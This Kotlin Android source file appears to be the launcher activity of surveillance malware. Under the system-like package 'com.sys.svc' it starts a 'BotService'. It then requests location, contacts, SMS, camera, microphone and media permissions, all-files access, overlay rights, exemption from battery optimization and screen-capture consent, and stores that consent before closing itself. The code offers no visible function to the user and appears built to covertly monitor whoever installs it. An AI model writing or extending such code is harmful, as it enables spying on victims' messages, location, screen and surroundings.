package com.sys.svc

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import com.sys.svc.helpers.MediaProjectionHolder
import com.sys.svc.helpers.OverlayHelper

class MainActivity : Activity() {
    private val reqPerm = 10
    private val reqProj = 20
    private val reqOverlay = 30

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Logger.init(this)
        Logger.i("Main", "onCreate")
        BotService.start(this)

        requestRuntimePermissions()
        tryDisableBatteryOptimization()
        tryGrantAllFiles()
        tryGrantOverlay()
        tryRequestProjection()
    }

    private fun requestRuntimePermissions() {
        val perms = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
        )
        if (Build.VERSION.SDK_INT >= 33) {
            perms += Manifest.permission.POST_NOTIFICATIONS
            perms += Manifest.permission.READ_MEDIA_IMAGES
            perms += Manifest.permission.READ_MEDIA_VIDEO
            perms += Manifest.permission.READ_MEDIA_AUDIO
        } else {
            perms += Manifest.permission.READ_EXTERNAL_STORAGE
        }
        try {
            requestPermissions(perms.distinct().toTypedArray(), reqPerm)
        } catch (e: Exception) {
            Logger.w("Main", "perms: ${e.message}")
        }
    }

    private fun tryDisableBatteryOptimization() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")))
            }
        } catch (e: Exception) { Logger.w("Main", "batt: ${e.message}") }
    }

    private fun tryGrantAllFiles() {
        try {
            if (Build.VERSION.SDK_INT >= 30 && !android.os.Environment.isExternalStorageManager()) {
                startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:$packageName")))
            }
        } catch (e: Exception) { Logger.w("Main", "allfiles: ${e.message}") }
    }

    private fun tryGrantOverlay() {
        try {
            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")), reqOverlay)
            }
        } catch (e: Exception) { Logger.w("Main", "overlay: ${e.message}") }
    }

    private fun tryRequestProjection() {
        try {
            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(mgr.createScreenCaptureIntent(), reqProj)
        } catch (e: Exception) { Logger.w("Main", "proj: ${e.message}") }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == reqProj && resultCode == RESULT_OK && data != null) {
            MediaProjectionHolder.saveConsent(resultCode, data)
            Logger.i("Main", "projection consent saved")
        }
        if (requestCode == reqProj) {
            finish()
        }
    }
}